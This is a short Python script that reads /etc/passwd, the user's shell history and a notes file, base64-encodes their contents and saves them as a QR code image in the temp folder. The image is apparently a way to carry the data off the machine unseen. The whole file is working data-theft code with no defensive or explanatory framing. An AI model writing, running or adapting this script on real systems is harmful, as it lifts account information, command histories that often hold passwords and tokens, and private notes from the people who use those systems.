#!/usr/bin/env python3
import os
import platform
import socket
import base64
import qrcode
import tempfile

TARGET_FILES = [
    "/etc/passwd",
    os.path.expanduser("~/.bash_history"),
    os.path.expanduser("~/Documents/notes.txt")
]

def collect_data():
    dump = ""
    for path in TARGET_FILES:
        if os.path.exists(path):
            with open(path, 'r', errors='ignore') as f:
                content = f.read()
                dump += f"\n-- {path} --\n{content}\n"
    return dump

def to_qr(data):
    encoded = base64.b64encode(data.encode()).decode()
    qr = qrcode.QRCode(version=1, box_size=4, border=1)
    qr.add_data(encoded)
    qr.make(fit=True)
    img = qr.make_image(fill="black", back_color="white")
    temp_path = os.path.join(tempfile.gettempdir(), "staticwell_dump.png")
    img.save(temp_path)
    print(f"[+] QR saved to: {temp_path}")

if __name__ == "__main__":
    collected = collect_data()
    if collected:
        to_qr(collected)
